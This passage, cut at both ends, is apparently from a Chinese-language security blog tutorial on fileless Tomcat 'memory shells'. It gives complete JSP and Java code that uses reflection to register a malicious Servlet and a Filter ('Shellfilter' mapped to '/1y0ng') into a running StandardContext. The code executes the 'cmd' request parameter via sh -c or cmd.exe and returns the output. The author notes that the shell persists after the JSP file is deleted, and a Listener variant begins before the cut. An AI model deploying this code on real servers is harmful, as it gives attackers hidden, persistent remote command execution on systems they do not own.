cmd&#125;;</span><br><span class="line">      <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">      <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">      <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">      out.println(output);</span><br><span class="line">      out.flush();</span><br><span class="line">      out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">  <span class="type">Field</span> <span class="variable">applicationField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  applicationField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span>  (ApplicationContext) applicationField.get(servletContext);</span><br><span class="line"></span><br><span class="line">  <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span>  (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">  <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">  wrapper.setName(<span class="string">&quot;Shell2Servlet&quot;</span>);</span><br><span class="line">  wrapper.setServletClass(Shell2Servlet.class.getName());</span><br><span class="line"></span><br><span class="line">  wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">Shell2Servlet</span>());<span class="comment">//实例化Shell2Servlet</span></span><br><span class="line"></span><br><span class="line">  context.addChild(wrapper);</span><br><span class="line">  context.addServletMapping(<span class="string">&quot;/shell2&quot;</span>, <span class="string">&quot;Shell2Servlet&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>先访问shell.jsp,此时已经将<code>Shell2Servlet</code>注册进了tomcat容器</p><p>再访问shell2并传入cmd参数，发现命令被成功执行，</p><p><img src="image-20230502161354097.png" alt="image-20230502161354097"></p><p>然后我们将shell.jsp给删了（服务不重启）</p><p><img src="image-20230502161731013.png" alt="image-20230502161731013"></p><p>此时我们访问shell2，发现还是可以执行命令，内存马的优点就在于这里，马不依靠文件存在</p><p><img src="image-20230502161828326.png" alt="image-20230502161828326"></p><h1 id="Filter内存马">Filter内存马</h1><p>Filter作为Java web三大件之一，是一种可以对请求和响应进行拦截和处理的组件。Filter可以实现许多功能，如登录控制，权限管理，过滤敏感词汇等。Filter的使用需要<code>实现Filter接口</code>，<code>重写doFilter方法</code>，并且配置拦截路径。拦截路径可以用注解@WebFilter或者xml方式来配置。在doFilter方法中，我们可以对ServletRequest和ServletResponse对象进行操作，也可以调用FilterChain对象的doFilter方法来放行请求和响应。Filter的执行顺序是按照配置顺序来决定的，<code>先配置的先执行</code>。</p><p>和servlet类似，我们先按正常操作添加一个Myfilter.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myfilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter被执行了&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在webxml中绑定url</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>Myfilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.example.filter.Myfilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>Myfilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么在访问/hello的时候doFilter就会被调用</p><p><img src="image-20230506221604706.png" alt="image-20230506221604706"></p><p>那我们还是按照之前的方法来构建doFilter内存马</p><p>首先我们新建一个shell2.jsp，同时构造一个恶意的<code>Shellfilter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shellfilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到<code>org.apache.catalina.startup.ContextConfig#configureContext</code>中和filter有关的部分如下</p><p><img src="image-20230506221853333.png" alt="image-20230506221853333"></p><p>关键的语句就两条</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.addFilterDef(filter);<span class="comment">//将指定的 Filter 添加到 Context 中</span></span><br><span class="line">context.addFilterMap(filterMap);<span class="comment">//根据指定的 FilterMap 对象创建一个过滤器映射，并将其添加到 Context 中</span></span><br></pre></td></tr></table></figure><p>其中的filter对应的是<code>org.apache.tomcat.util.descriptor.web.FilterDef</code>类，filterMap对应的是</p><p><code>org.apache.tomcat.util.descriptor.web.FilterMap</code>类</p><p>我们可以先debug看看添加操作的时候filter和filterMap里面有哪些属性值</p><p><img src="image-20230506223151521.png" alt="image-20230506223151521"></p><p><img src="image-20230506223223005.png" alt="image-20230506223223005"></p><p>在shell2.jsp中对应的操作为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置filterDef</span></span><br><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilterClass(Shellfilter.class.getName());<span class="comment">//设置对应的类名</span></span><br><span class="line">filterDef.setFilterName(<span class="string">&quot;Shellfilter&quot;</span>);<span class="comment">//设置对应的tFilterName</span></span><br><span class="line">filterDef.setFilter(<span class="keyword">new</span> <span class="title class_">Shellfilter</span>());<span class="comment">//实例化Shellfilter</span></span><br><span class="line">standardContext.addFilterDef(filterDef);<span class="comment">//添加进standardContext</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置filterMap</span></span><br><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.setFilterName(<span class="string">&quot;Shellfilter&quot;</span>);<span class="comment">//设置对应的tFilterName</span></span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/1y0ng&quot;</span>);<span class="comment">//设置要映射的url</span></span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">//设置分派类型,REQUEST表示普通的 HTTP 请求</span></span><br><span class="line">standardContext.addFilterMap(filterMap);<span class="comment">//添加进standardContext</span></span><br></pre></td></tr></table></figure><p>通过上述代码，按理来说在访问/1y0ng页面的时候传入参数cmd就应该可以执行相关的命令了，但实际上会失败，为什么呢？原因是少了一个<code>filterConfig</code></p><p>我们来比较一下standardContext在<code>只进行到configureContext方法</code>和<code>服务器初始化完成后</code>之间的区别</p><p><img src="image-20230506225327889.png" alt="image-20230506225327889"></p><p>在看看执行完shell2.jsp后的standardContext</p><p><img src="image-20230506225953552.png" alt="image-20230506225953552"></p><p>可见在执行完shell2.jsp后只将<code>filterDef</code>和<code>filterMap</code>放到了<code>standardContext</code>的<code>filterDefs</code>和<code>filterMaps</code>中，而filterConfigs中却依旧没有Shellfilter，所以导致Shellfilter没有成功注册到tomcat中</p><p>filterConfig对应的类为<code>org.apache.catalina.core.ApplicationFilterConfig</code>类，同时还包含了<code>filterDef</code>和对应的<code>standardContext</code>（从ApplicationFilterConfig的构造方法里可以看出）</p><p>那么对于standardContext的一个结构图为：</p><p><img src="image-20230506231226978.png" alt="image-20230506231226978"></p><p>所以这里要将<code>filterDef</code>和<code>standardContext</code>放到filterConfig中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用反射创建filterConfig对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">configclass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">configconstructor</span> <span class="operator">=</span> configclass.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">configconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">FilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (FilterConfig) configconstructor.newInstance(standardContext,filterDef);</span><br></pre></td></tr></table></figure><p>再将<code>filterConfig</code>放到filterConfigs中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反射获取filterConfigs</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">configsfield</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">configsfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) configsfield.get(standardContext);</span><br><span class="line">filterConfigs.put(<span class="string">&quot;Shellfilter&quot;</span>,filterConfig);</span><br></pre></td></tr></table></figure><p>故完整的shell2.jsp为：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shellfilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">            out.println(output);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//拿到standardContext</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span>  (ApplicationContext) applicationField.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span>  (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置filterDef</span></span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilterClass(Shellfilter.class.getName());</span><br><span class="line">    filterDef.setFilterName(<span class="string">&quot;Shellfilter&quot;</span>);</span><br><span class="line">    filterDef.setFilter(<span class="keyword">new</span> <span class="title class_">Shellfilter</span>());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置filterMap</span></span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.setFilterName(<span class="string">&quot;Shellfilter&quot;</span>);</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/1y0ng&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将standardContext和filterDef放到filterConfig中</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">configclass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">configconstructor</span> <span class="operator">=</span> configclass.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">    configconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">FilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (FilterConfig) configconstructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射获取filterConfig</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">configsfield</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    configsfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) configsfield.get(standardContext);</span><br><span class="line">    filterConfigs.put(<span class="string">&quot;Shellfilter&quot;</span>,filterConfig);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>服务器启动以后先访问/shll2.jsp，再访问/1y0ng并加上cmd参数，发现命令成功执行</p><p><img src="image-20230506231812316.png" alt="image-20230506231812316"></p><p>filterConfigs中也带上了Shellfilter</p><p><img src="image-20230506232028066.png" alt="image-20230506232028066"></p><h1 id="Listener内存马">Listener内存马</h1><p>Listener主要分为三个大类：ServletContext监听、Session监听、Request监听</p><p>我们这里主要利用<code>Request监听</code>构造内存马</p><p>首先写个demo大致理解一下Listener的使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.listener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mylistener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;请求已经销毁&quot;</span>);</span><br><span class="line">        count--;</span><br><span class="line">        System.out.println(<span class="string">&quot;当前请求数量：&quot;</span> + count);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;请求已经初始化&quot;</span>);</span><br><span class="line">        count++;</span><br><span class="line">        System.out.println(<span class="string">&quot;当前请求数量：&quot;</span> + count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在web.xml中添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>com.example.listener.Mylistener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行服务器，当发起一个请求的时候会依次调用<code>requestInitialized</code>和<code>requestDestroyed</code>方法</p><p><img src="image-20230507212431609.png" alt="image-20230507212431609"></p><p>我们可以通过<code>javax.servlet.ServletRequestEvent#getServletRequest</code>方法拿到<code>request</code>,进而拿到<code>response</code>回显结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> sre.getServletRequest();<span class="comment">//拿到servletRequest</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">requestF</span> <span 